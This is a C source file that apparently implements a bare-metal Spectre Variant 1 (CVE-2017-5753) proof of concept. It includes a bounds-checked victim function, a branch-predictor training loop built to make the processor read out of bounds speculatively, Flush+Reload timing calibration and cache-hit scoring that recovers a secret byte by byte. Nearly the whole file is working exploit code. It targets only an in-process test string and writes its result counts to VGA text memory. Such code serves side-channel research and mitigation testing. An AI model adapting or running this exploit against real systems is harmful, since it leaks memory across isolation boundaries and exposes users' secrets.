/**
 * Spectre - Variant 1: Bounds Check Bypass (CVE-2017-5753)
 *
 * Description:
 *
 * Systems with microprocessors utilizing speculative execution and branch prediction
 * may allow unauthorized disclosure of information to an attacker with local user access
 * via a side-channel analysis.
 *
 */




typedef unsigned long         size_t;
typedef unsigned int          uint32_t;
typedef unsigned long long    uint64_t;
typedef unsigned char         uint8_t;
typedef unsigned short int    uint16_t;
enum color {
    BLACK = 0,
    BRIGHT = 7
};

enum size {
    COLS = 80,
    ROWS = 25
};

uint16_t *const video = (uint16_t*) 0xB8000;

void putc(uint8_t x, uint8_t y, enum color fg, enum color bg, char c) {
    video[y * COLS + x] = (bg << 12) | (fg << 8) | c;
}

void puts(uint8_t x, uint8_t y, enum color fg, enum color bg, const char *s) {
    for (; *s; s++, x++)
        putc(x, y, fg, bg, *s);
}
void print_number(uint8_t x,uint8_t y,size_t  num){
  char buffer[20];
  char res[20];
  int i=0;
  while(num>0){
    buffer[i++]='0'+num%10;
    num/=10;
  }
  buffer[i]='\0';
  int j,len=i;
  for(j=0;j<len;++j){
    res[j]=buffer[len-j-1];
  }
  res[j]='\0';
  puts(x,y,BRIGHT,BLACK,res);
}
void clear(enum color bg) {
    uint8_t x, y;
    for (y = 0; y < ROWS; y++)
        for (x = 0; x < COLS; x++)
            putc(x, y, bg, bg, ' ');
}
static inline void _mm_clflush(void *p){
  __asm__ volatile("clflush 0(%0)" : : "r"(p) : "eax");
}
static inline void fence() { __asm__ volatile ("mfence"); }
static inline uint64_t __rdtsc(){
  uint64_t a=0;
  __asm__ volatile("mfence");
  __asm__ volatile("rdtsc":"=A"(a));
  __asm__ volatile("mfence");
  return a;
}


void *memset(void *ptr, int value, size_t num) {
    unsigned char *p = ptr;
    for (size_t i = 0; i < num; ++i) {
        p[i] = (unsigned char)value;
    }
    return ptr;
}
//################################################
#define CACHE_PAGE      4096            // 2^12 -> shl $12, %rax



typedef struct {
    uint8_t unused_1[CACHE_PAGE];       // Memory separator
    union {
        size_t x;                       // Valid array index for speculative storage (for Spectre V4)
        uint8_t unused_2[CACHE_PAGE];   // Memory separator
    };
    union {
        size_t indices_size;            // Indices array size (for Spectre V1/V4)
        uint8_t unused_3[CACHE_PAGE];   // Memory separator
    };
    union {
        uint8_t indices[16];            // Array with valid indices (for Spectre V1/V4)
        uint8_t unused_4[CACHE_PAGE];   // Memory separator
    };
    uint8_t table[256 * CACHE_PAGE];    // Array for Flush+Reload tests
    uint8_t unused_5[CACHE_PAGE];       // Memory separator
} memory_buffer_t;
//#####################
int _strlen(const char *str) {
	int i = 0;
	while (str[i] != 0)
		i++;
	return i;
}
//#########################
typedef struct {
    int tries;
    int zero;
    int s1;
    int s2;
    uint8_t v1;
    uint8_t v2;
} result_t;

//char *secret = "The Magic Words are Squeamish Ossifrage.";
char *secret = "Spectre breaks the isolation between different applications. It allows an attacker to trick er-free.";

memory_buffer_t buffer = {
    .indices_size = 16,
    .indices = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16}
};



typedef size_t (*exploit_handler)(size_t address, int tries);

int execute(void *addres, size_t len, int tries, exploit_handler exploit);
//################################################
uint8_t temp = 0; // To not optimize victim() function

void victim(size_t x) {
    if (x < buffer.indices_size) {
        temp &= buffer.table[buffer.indices[x] * CACHE_PAGE];
    }
}

size_t exploit(size_t address, int tries) {
    size_t malicious_x = address - (size_t)buffer.indices;  // Set a malicious (speculative) array index
    size_t training_x = tries % buffer.indices_size;        // Set a valid (training) array index
    
    // 30 loops: 5 training runs (x = training_x), one attack run (x = malicious_x)
    for (int i = 29; i >= 0; i--) {
        _mm_clflush(&buffer.indices_size);          // Flush indices array size from cache to force branch prediction
        for (volatile int z = 0; z < 100; z++)
	{
			} 
        
        // Bit twiddling to set x = training_x if i % 6 != 0 or malicious_x if i % 6 == 0
        // Avoid jumps in case those tip off the branch predictor
        size_t x = ((i % 6) - 1) & ~0xFFFF; // Set x = FFFFF0000 if i % 6 == 0, else x = 0
        x = (x | (x >> 16));                // Set x = -1 if i & 6 = 0, else x = 0
        x = training_x ^ (x & (malicious_x ^ training_x));
        
        victim(x);
    }
    
    // Return the training index to exclude it from Flush+Reload test
    return buffer.indices[training_x];
}
//################################

//################################






static size_t detect_flush_reload_threshold(void) {
    size_t reload_time = 0, flush_reload_time = 0, threshold, count = 1000000;
    uint64_t start = 0, end = 0;
    uint8_t dummy[4096];
    uint8_t *ptr = dummy + 2048;
    volatile uint8_t *vptr = ptr; // To avoid optimization
    unsigned int junk = 0;

    junk = *vptr;
    for (int i = 0; i < count; i++) {
        start = __rdtsc();
        junk = *vptr;
        end = __rdtsc();
        reload_time += (end - start);
    }
    
    for (int i = 0; i < count; i++) {
        _mm_clflush(ptr);
        start = __rdtsc();
        junk = *vptr;
        end = __rdtsc();
        flush_reload_time += (end - start);
    }
    reload_time /= count;
    flush_reload_time /= count;

    //printf("Flush+Reload: %zd cycles, Reload only: %zd cycles\n", flush_reload_time, reload_time);
    threshold = (flush_reload_time + reload_time * 2) / 3;
    //printf("Flush+Reload threshold: %zd cycles\n", threshold);
    
    return threshold;
}

static void read_byte(size_t address, result_t *result, int tries, size_t threshold, exploit_handler exploit) {
    unsigned int junk = 0;
    volatile uint8_t *addr;
    int v1 = -1, v2 = -1, v3 = -1;
    int s[256];
    
    memset(result, 0, sizeof(*result));
    memset(s, 0, sizeof(s));
    
    for (result->tries = 0; result->tries < tries; result->tries++) {
        size_t exclude_i = exploit(address, result->tries);
        
        // Time reads. Order is slightly mixed up to prevent stride prediction
        for (int i = 0; i < 256; i++) {
            register uint64_t time1, time2;
            int mix_i = ((i * 167) + 13) & 255;
            addr = buffer.table + mix_i * CACHE_PAGE;
            time1 = __rdtsc();
            junk = *addr;
            time2 = __rdtsc() - time1;
            
            if (time2 <= threshold && mix_i != exclude_i) {
                s[mix_i]++; // Cache hit -> score +1 for this value
            }
            
            _mm_clflush((void *)addr); // Flush from cache and try next address
        }
        
        // Locate 3 highest bytes
        v1 = v2 = v3 = -1;
        for (int i = 0; i < 256; i++) {
            if (s[i] == 0) {
                continue;
            }
            if (v1 < 0 || s[i] > s[v1]) {
                v3 = v2;
                v2 = v1;
                v1 = i;
            } else if (v2 < 0 || s[i] > s[v2]) {
                v3 = v2;
                v2 = i;
            } else if (v3 < 0 || s[i] > s[v3]) {
                v3 = i;
            }
        }
        
        if (v1 > 0) {
            // First byte has non-zero value
            if (v2 != -1) {
                // Second best byte defined
                if (s[v1] > 2 * s[v2] + 2) {
                    result->tries++;
                    break;
                }
            } else {
                // Only first byte defined
                if (s[v1] > 2) {
                    result->tries++;
                    break;
                }
            }
        } else if (v1 == 0 && v2 != -1) {
            // First byte has zero value & second best byte defined
            // Possible misprediction for spectre_v1 and meltdown_fast
            if (v3 != -1) {
                // Third best byte defined
                if (s[v2] > 2 * s[v3] + 2) {
                    result->tries++;
                    break;
                }
            } else {
                // Third best byte undefined
                if (s[v2] > 2) {
                    result->tries++;
                    break;
                }
            }
        }
    }
    
    if (v1 > 0) {
        // First byte has non-zero value
        result->v1 = (uint8_t)v1;
        result->s1 = s[v1];
        if (v2 != -1) {
            // Second best value defined
            result->v2 = (uint8_t)v2;
            result->s2 = s[v2];
        }
    } else if (v1 == 0) {
        // First byte has zero value
        // Possible misprediction for spectre_v1 and meltdown_fast
        result->zero = s[v1];
        if (v2 != -1) {
            // Second best byte defined
            result->v1 = (uint8_t)v2;
            result->s1 = s[v2];
            if (v3 != -1) {
                // Third best byte defined
                result->v2 = (uint8_t)v3;
                result->s2 = s[v3];
            }
        } else {
            // Zero is the correct value for first byte
            // No misprediction
            result->v1 = (uint8_t)v1;
            result->s1 = s[v1];
        }
    }
}

int execute(void *addres, size_t len, int tries, exploit_handler exploit) {
    /*uint8_t *dump = malloc(len);
    if (dump == NULL) {
        printf("Memory allocation error!\n");
        return 1;
    }*/
    int count=0;
    // Write data to table array to ensure it is memory backed
    memset(buffer.table, 1, sizeof(buffer.table));
    
    size_t threshold = detect_flush_reload_threshold();
    size_t x = (size_t)addres;
    
    // Flush table[CACHE_PAGE * (0..255)] from cache
    for (int i = 0; i < 256; i++) {
        _mm_clflush(buffer.table + i * CACHE_PAGE);
    }
    
    //printf("Reading %zd bytes in %d tries:\n", len, tries);
    //printf("%p    STATUS  1st   SCORE  2nd   SCORE TRIES ZEROS\n", (void *)x);
    
    for (int i = 0; i < len; i++) {
        result_t result;
        
        //printf("%p ", (void *)x);
        read_byte(x++, &result, tries, threshold, exploit);
        
        /*if (result.s1 > 0) {
            printf("%9s ", result.zero > 0 ? "Zero" : (result.s1 >= 2 * result.s2 + 2 ? "Success" : "Unclear"));
            printf("0x%02X %c %5d ", result.v1, (result.v1 >= 0x20 && result.v1 <= 0x7E) ? result.v1 : ' ', result.s1);
            if (result.s2 > 0) {
                printf("0x%02X %c %5d ", result.v2, (result.v2 >= 0x20 && result.v2 <= 0x7E) ? result.v2 : ' ', result.s2);
            } else {
                printf("   -       - ");
            }
            printf("%5d ", result.tries);
            if (result.zero > 0) {
                printf("%5d", result.zero);
            } else {
                printf("    -");
            }
        } else {
            
            printf("%9s    -       -    -       - %5d     -", "Undefined", result.tries);
            count++;
        }*/
        if(result.s1<=0){
          count++;
        }
       
        //printf("\n");
        
        
    }
    
  
    
   
    
    return count;
}
//################################
int __attribute__((noreturn)) main() {
//int main() {
    void *address = secret;

    size_t len = _strlen(secret);
    int count=200;
    
    //printf("CVE-2017-5753: Spectre Variant 1\n");
    int res=execute(address, len, count, exploit);
    clear(BLACK);
    //printf("%d,%d",count,res);
      
    print_number(0,0,count);
    print_number(0,5,res);
    while(1);
}
